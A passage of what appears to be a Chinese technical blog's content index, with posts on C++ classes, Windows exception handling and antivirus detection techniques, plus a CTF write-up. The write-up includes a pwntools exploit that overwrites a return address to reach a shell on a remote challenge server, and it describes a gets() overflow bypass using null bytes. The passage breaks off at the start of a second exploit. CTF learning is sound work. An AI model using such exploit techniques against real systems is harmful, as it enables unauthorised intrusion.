创建，需要默认构造函数，并用 <code>delete [] ptr</code> 释放。</li></ul></li><li><p><strong>类作用域:</strong></p><ul><li>  类成员（数据、函数、类型、常量、枚举）具有类作用域，在类外部访问需要限定。</li><li>  可以使用 <code>static const</code> 或 <code>static constexpr</code> (C++11 推荐) 定义类范围内的常量。</li><li>  C++11 引入了**作用域内枚举 (<code>enum class</code>)**，提高了枚举的类型安全性和作用域控制。</li></ul></li><li><p><strong>抽象数据类型 (ADT):</strong></p><ul><li>  ADT 是一个侧重于操作接口而非内部实现的数学模型。</li><li>  C++ 类是实现 ADT 的强大工具，通过公共接口提供操作，通过私有成员隐藏实现细节，体现了封装和抽象的原则。</li></ul></li></ol><p>通过使用类，我们可以创建模块化、可重用、易于维护的复杂程序，更好地模拟现实世界的问题。掌握类的设计和使用是精通 C++ 的关键一步。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows异常处理机制深度解析</title>
      <link href="2025/03/31/windows_exception/"/>
      <url>2025/03/31/windows_exception/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是Windows异常"><a href="#什么是Windows异常" class="headerlink" title="什么是Windows异常"></a>什么是Windows异常</h2><p>Windows异常是指在程序执行过程中遇到的非正常情况，这些情况会中断程序正常的执行流程。Windows操作系统提供了完善的异常处理机制来应对这些情况，使程序能够优雅地处理错误并尽可能恢复正常运行。</p><p>从本质上看，Windows异常可分为两大类：硬件异常和软件异常。硬件异常由CPU直接产生，如内存访问违规、除零错误等；而软件异常则是由程序代码主动触发，如C++的throw语句、Windows API中的RaiseException函数等。</p><h2 id="常见的异常触发情况及现象"><a href="#常见的异常触发情况及现象" class="headerlink" title="常见的异常触发情况及现象"></a>常见的异常触发情况及现象</h2><p>在日常编程和系统使用中，异常可能由多种情况触发。内存访问违规是一种常见情况，包括访问空指针（0x00000000）、访问已释放的内存或尝试写入只读内存区域。计算异常也时有发生，如除零操作、整数溢出或浮点运算错误。非法指令异常则可能源于执行无效或特权指令，或是错误地执行数据区域的内容。此外，还有程序通过RaiseException API、C++的throw语句或.NET中的throw指令主动抛出的异常。</p><p><img src="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" class="lazyload" data-srcset="https://s2.loli.net/2025/03/31/Zv4nF21k9QtxNm5.jpg" srcset="data:image/png;base64,666" alt="exception.jpg"></p><p>这些异常触发时，用户可能会看到不同的现象：应用程序崩溃并显示”XXX已停止工作”的对话框；Windows错误报告工具弹出；程序无预警地终止运行；在调试环境中触发断点；甚至在严重的内核模式异常情况下导致系统蓝屏。这些现象都是Windows异常处理机制工作的外在表现。</p><h2 id="Windows异常处理流程"><a href="#Windows异常处理流程" class="headerlink" title="Windows异常处理流程"></a>Windows异常处理流程</h2><p>当异常发生时，Windows会按照一个严格的顺序尝试处理异常。首先是异常的触发，CPU检测到异常条件并生成中断。如果程序在调试器下运行，调试器拥有第一优先权来处理这个异常，这使开发人员能够在异常发生的第一时间分析问题。</p><p>若无调试器或调试器选择不处理，系统会调用已注册的向量化异常处理函数（Vectored Exception Handlers，VEH）。接下来，如果异常仍未被处理，系统会遍历当前线程的结构化异常处理（Structured Exception Handling，SEH）链，查找能够处理该异常的处理器。</p><p>当SEH链中没有合适的处理器时，系统会调用顶层异常过滤器（UnhandledExceptionFilter函数）作为最后的应用程序级防线。如果所有这些机制都无法处理异常，系统将接管并执行默认处理：显示错误对话框并终止进程。这种层层递进的设计确保了异常能够在最适当的层次被处理，同时提供了多重保障机制。</p><p>即：<code>异常触发 -- 调试器（若存在） -- 已注册的VEH处理函数（影响整个进程） -- 遍历线程的SEH链（影响单个线程） -- 顶层异常过滤器（兜底） -- 系统默认处理</code></p><h2 id="异常处理各环节的作用及区别"><a href="#异常处理各环节的作用及区别" class="headerlink" title="异常处理各环节的作用及区别"></a>异常处理各环节的作用及区别</h2><p>调试器处理是异常处理流程的第一关卡。调试器拥有处理异常的最高优先级，可以在异常发生的第一时间捕获并暂停程序执行。这一环节的独特之处在于它能够展示异常发生时的完整上下文，允许开发者修改程序状态后继续执行。异常在调试器中分为一次机会和二次机会异常，为调试提供了灵活性。</p><p>向量化异常处理（VEH）提供了一种全局性的异常处理机制，其最大特点是不受函数调用堆栈的限制。开发者可以通过AddVectoredExceptionHandler API注册处理函数，系统会按注册顺序或反序调用所有处理函数。VEH特别适合全局错误监控、日志记录等场景，且不需要在代码中添加特殊的语言结构（如try/except）。</p><p>结构化异常处理（SEH）是Windows传统的核心异常处理方式，提供了基于调用栈的异常保护机制。它通过<code>__try/__except/__finally</code>块实现，采用链表结构并与函数调用堆栈紧密关联。SEH遵循”先注册后使用”的LIFO原则，这意味着最近设置的异常处理器会首先被调用。值得一提的是，C++异常处理机制在Windows平台的底层实现也是基于SEH的。</p><p>顶层异常过滤器作为应用程序级别的最后防线，负责处理所有未被捕获的异常。通过SetUnhandledExceptionFilter API，每个进程可以设置一个顶层异常过滤器。这一机制常用于实现崩溃转储功能，是构建自定义应用程序错误报告系统的理想选择。</p><p>当所有用户定义的异常处理器都无法处理异常时，操作系统的默认处理机制接管。系统会显示应用程序错误对话框，可能生成错误报告发送到Microsoft，并终止发生异常的进程，释放其占用的资源。这是保证系统稳定性的最后一道防线。</p><p>通过这种分层的异常处理机制，Windows提供了强大而灵活的错误处理能力，既适合开发人员进行调试，也能为最终用户提供较好的错误恢复体验。对于安全研究人员来说，深入理解这套机制对于漏洞分析和利用同样具有重要意义。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>病毒扫描背后的秘密：从特征码到智能防御的技术揭秘</title>
      <link href="2025/03/31/virus_defence/"/>
      <url>2025/03/31/virus_defence/</url>
      
        <content type="html"><![CDATA[<p>在数字世界中，病毒与杀毒软件的对抗从未停歇。要实现精准的病毒查杀，核心依赖于三大技术：<strong>病毒特征码识别</strong>、<strong>行为监控</strong>以及<strong>启发式分析</strong>。本文将解析这些技术的原理与实现方式，揭开病毒扫描背后的原理。</p><hr><h2 id="病毒扫描的核心：特征码检测"><a href="#病毒扫描的核心：特征码检测" class="headerlink" title="病毒扫描的核心：特征码检测"></a>病毒扫描的核心：特征码检测</h2><h3 id="特征码检测的实现过程"><a href="#特征码检测的实现过程" class="headerlink" title="特征码检测的实现过程"></a>特征码检测的实现过程</h3><p><strong>病毒特征码</strong>是从病毒样本中提取的独特二进制代码片段，通常不超过64字节，可视为病毒的“数字指纹”。特征码检测的实现需要经过以下技术流程：</p><ol><li><p><strong>样本采集与预处理</strong><br>通过沙箱捕获、用户上报或蜜罐系统收集病毒样本。例如，安全厂商VirusTotal每天接收超过100万份可疑文件，经人工分析后提取有效特征码。样本需经过脱壳（如UPX、ASPack等常见壳）、解密等预处理，以获取病毒原始代码。</p></li><li><p><strong>代码逆向与特征定位</strong><br>使用逆向工具（如IDA Pro、Ghidra）分析病毒二进制文件，定位核心功能模块（如感染模块、加密函数）。例如，WannaCry病毒的MS17-010漏洞利用代码段会被标记为关键特征。为确保特征码稳定性，通常会选择代码段（.text节）而非数据段（.data节），避免病毒变种修改数据导致失效。</p></li><li><p><strong>复合特征码生成</strong><br>对多态病毒（如Emotet），需提取多段特征码形成逻辑组合。例如，某勒索病毒的特征码可能包括：</p><ul><li>字符串特征：<code>&quot;This file is encrypted by [家族名]&quot;</code>；</li><li>代码特征：特定API调用序列（如<code>CryptEncrypt</code>→<code>DeleteFile</code>）；</li><li>哈希特征：加密函数所在代码节的SHA-256值。</li></ul></li><li><p><strong>特征码优化与验证</strong><br>使用工具（如MyCCL）进行冲突测试：将特征码插入正常文件，验证是否触发误报。通过模糊哈希（ssdeep）技术降低特征码对微小修改的敏感度，提升对抗变种病毒的能力。</p></li></ol><hr><h2 id="行为监控：实时防御的“动态哨兵”"><a href="#行为监控：实时防御的“动态哨兵”" class="headerlink" title="行为监控：实时防御的“动态哨兵”"></a>行为监控：实时防御的“动态哨兵”</h2><h3 id="行为监控的技术原理"><a href="#行为监控的技术原理" class="headerlink" title="行为监控的技术原理"></a>行为监控的技术原理</h3><p>行为监控不依赖静态特征码，而是通过<strong>钩子（Hook）技术</strong>实时监控程序行为，主要关注以下高危操作：</p><ul><li><strong>文件操作</strong>：短时间内加密大量文件（如勒索病毒行为）；</li><li><strong>进程注入</strong>：将代码写入其他进程内存（如DLL注入）；</li><li><strong>注册表篡改</strong>：修改系统启动项或服务配置；</li><li><strong>网络行为</strong>：异常端口扫描或C2服务器通信。</li></ul><h3 id="实现流程示例（以勒索病毒检测为例）"><a href="#实现流程示例（以勒索病毒检测为例）" class="headerlink" title="实现流程示例（以勒索病毒检测为例）"></a>实现流程示例（以勒索病毒检测为例）</h3><ol><li><p><strong>API监控层</strong><br>通过内核级钩子（如Windows的SSDT Hook）监控<code>CreateFile</code>、<code>WriteFile</code>等文件操作API。当某进程连续调用<code>CreateFile</code>打开100个文档文件，立即触发预警。</p></li><li><p><strong>行为关联分析</strong><br>结合上下文判断操作风险：若该进程同时调用<code>CryptGenKey</code>生成加密密钥，并删除卷影副本（通过<code>vssadmin.exe</code>），则判定为勒索病毒，触发实时拦截。</p></li><li><p><strong>沙箱验证机制</strong><br>对可疑进程进行隔离运行（如Cuckoo沙箱），观察其是否释放加密勒索信（如<code>README.txt</code>），最终确认恶意行为。</p></li></ol><hr><h2 id="启发式分析：未知威胁的“逻辑捕手”"><a href="#启发式分析：未知威胁的“逻辑捕手”" class="headerlink" title="启发式分析：未知威胁的“逻辑捕手”"></a>启发式分析：未知威胁的“逻辑捕手”</h2><h3 id="启发式分析的核心机制"><a href="#启发式分析的核心机制" class="headerlink" title="启发式分析的核心机制"></a>启发式分析的核心机制</h3><p>启发式分析通过预定义规则集对程序进行风险评分，主要检测以下可疑模式：</p><ol><li><p><strong>代码结构异常</strong>  </p><ul><li>PE头信息篡改（如入口点指向资源节）；</li><li>节区段熵值过高（可能经过加密或压缩）；</li><li>导入表异常（如仅依赖<code>LoadLibrary</code>和<code>GetProcAddress</code>动态加载API）。</li></ul></li><li><p><strong>行为模式评分</strong><br>构建评分系统（满分100分），例如：</p><ul><li>创建自启动项：+20分；</li><li>尝试关闭杀毒软件进程：+30分；</li><li>无数字签名且评分超过70分：判定为恶意程序。</li></ul></li><li><p><strong>机器学习模型</strong><br>使用随机森林或神经网络模型，输入特征包括：</p><ul><li>API调用序列（如<code>VirtualAlloc</code>→<code>WriteProcessMemory</code>→<code>CreateRemoteThread</code>的典型注入序列）；</li><li>字符串特征（如硬编码IP地址或域名）；</li><li>代码相似度（与已知病毒家族的代码块匹配度）。</li></ul></li></ol><hr><h2 id="病毒库的高效构建与匹配机制"><a href="#病毒库的高效构建与匹配机制" class="headerlink" title="病毒库的高效构建与匹配机制"></a>病毒库的高效构建与匹配机制</h2><p>病毒库的工程化设计直接影响扫描性能。典型方案包括：</p><ul><li><strong>分库存储</strong>：按特征码哈希首字母划分16个子库，减少遍历次数；</li><li><strong>增量更新</strong>：仅同步新增特征码，避免全量下载占用资源；</li><li><strong>并行处理</strong>：多线程同时扫描文件的不同区段，充分利用多核CPU性能。</li></ul><hr><h2 id="技术演进与未来防御趋势"><a href="#技术演进与未来防御趋势" class="headerlink" title="技术演进与未来防御趋势"></a>技术演进与未来防御趋势</h2><p>当前病毒防御面临两大挑战：</p><ol><li><strong>未知病毒检测</strong>：传统特征码仅能应对已知威胁；</li><li><strong>零日攻击防御</strong>：APT攻击常利用未公开漏洞，绕过常规检测。</li></ol><p>未来技术将向以下方向发展：</p><ul><li><strong>AI与机器学习</strong>：通过训练模型识别恶意代码模式，例如分析API调用序列或内存行为异常；</li><li><strong>云安全协同</strong>：实时共享全球病毒特征数据，构建分布式威胁情报网络；</li><li><strong>主动防御系统</strong>：基于程序行为实时拦截可疑操作，而非依赖事后特征匹配。</li></ul><hr><h2 id="用户防护建议"><a href="#用户防护建议" class="headerlink" title="用户防护建议"></a>用户防护建议</h2><ol><li><strong>选择杀毒软件</strong>：优先考虑病毒库更新频率快、资源占用低的工具；</li><li><strong>系统维护</strong>：定期安装安全补丁，避免漏洞被利用；</li><li><strong>安全意识</strong>：谨慎扫描不明来源的二维码或链接，防止钓鱼攻击。</li></ol><hr><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>病毒防御是技术与意识的双重博弈。尽管特征码技术仍是当前主流，但其局限性催生了行为分析、AI预测等新一代解决方案。用户需在依赖技术防护的同时，保持警惕，方能构筑全面的数字安全防线。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CyberSecurity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF_fresh</title>
      <link href="2024/11/10/xsctf_fresh/"/>
      <url>2024/11/10/xsctf_fresh/</url>
      
        <content type="html"><![CDATA[<h2 id="c-master"><a href="#c-master" class="headerlink" title="c_master"></a>c_master</h2><p><code>请使用简单的C语句对程序进行getshell吧！</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Try to write a C getshell program with my code!</span><br><span class="line">read(0,base,0x8);</span><br><span class="line">write(1,base,0x8);</span><br><span class="line">base+&#x3D;8;</span><br><span class="line">base-&#x3D;8;</span><br><span class="line">return 0;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">1024u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, s);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;read(0,base,0x8);&quot;</span>) )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;write(1,base,0x8);&quot;</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">          write(<span class="number">1</span>, &amp;v6[v4], <span class="number">8u</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base+=8;&quot;</span>) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v4 += <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;base-=8;&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v4 -= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)s, <span class="string">&quot;return 0;&quot;</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据输入确定写入数据的地址，那么可以直接将位置定位到main函数的返回地址，写入程序中提供的backdoor函数<br>需要注意程序开了canary，所以要多往后走一次</p><table><thead><tr><th>Low Address</th><th>…</th><th></th></tr></thead><tbody><tr><td></td><td>local var</td><td>&lt;- rsp</td></tr><tr><td></td><td>canary value</td><td>&lt;- rbp-8</td></tr><tr><td></td><td>old rbp</td><td>&lt;- rbp</td></tr><tr><td></td><td>return address</td><td></td></tr><tr><td></td><td>args</td><td></td></tr><tr><td>High Address</td><td>…</td><td></td></tr></tbody></table><p>坑：直接返回到backdoor函数又不可以，需要返回到实际执行system函数的代码地址</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;43.248.97.213&quot;</span>, <span class="number">30483</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;base+=8;&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(p64(<span class="number">0x4012c3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;return 0;&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;p1e4se_bec0me_4_c_m4ster_x5c7f&#125;</code></p><h2 id="rock-paper-scissors"><a href="#rock-paper-scissors" class="headerlink" title="rock_paper_scissors"></a>rock_paper_scissors</h2><p>欢迎来到石头剪刀布！<br>一共进行三十局，你赢了加一分，输了或平局不得分<br>获得十分就算胜利！<br>输入’石头’、’剪刀’或’布’来进行游戏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> RandomMove; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> userout; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v10; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v3 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v3);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402080);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020A0);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4020E6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402108);</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt;= <span class="number">9</span> &amp;&amp; v9 &lt;= <span class="number">29</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(&amp;byte_402139);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt; <span class="number">5</span> )</span><br><span class="line">      gets(v5);</span><br><span class="line">    __isoc99_scanf(&amp;unk_402151, v5);</span><br><span class="line">    userout = stringToMove(v5);</span><br><span class="line">    <span class="keyword">if</span> ( userout == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(&amp;byte_402158);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v10 &gt; <span class="number">8</span> || v10 &lt;= <span class="number">5</span> || (<span class="keyword">int</span>)hard() &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v10 == <span class="number">9</span> &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hell() != <span class="number">666</span> )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_10:</span><br><span class="line">        win(userout, v10);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        RandomMove = getRandomMove();</span><br><span class="line">        <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">        <span class="keyword">if</span> ( RandomMove == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402037);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( RandomMove &lt;= <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( RandomMove )</span><br><span class="line">            <span class="built_in">puts</span>(&amp;byte_40203E);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(&amp;s2);</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = determineWinner(userout, RandomMove);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_4021A7);</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402054);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_402073);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(&amp;byte_402061, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10);</span><br><span class="line">        ++v9;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)hard() &lt;= <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">      bewin(userout, v10);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中final函数就是最终的shell，而gets函数存在漏洞，可以使用栈溢出将当前函数的返回地址覆盖为final函数的返回地址<br>但是传输的payload需要符合一定条件<br>因为程序对输入进行了检查，输入的字符串必须是石头剪刀布的一种<br>这种情况下可以用%00作为payload，即输入石头的编码后加上%00，这样程序在处理字符串时遇到%00就会认为已经到字符串末尾了，而实际的payload会全部传输到内存中</p><blockquote><p>中文在C语言中使用utf-8编码，一个中文字符占用三个字节<br>在构造payload时要注意端序，例如“石头”的utf-8编码是<code>E79FB3E5A4B4</code>但是实际传输时是<code>p64(0xe5b39fe7)+p64(0xb4a4)</code></p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = 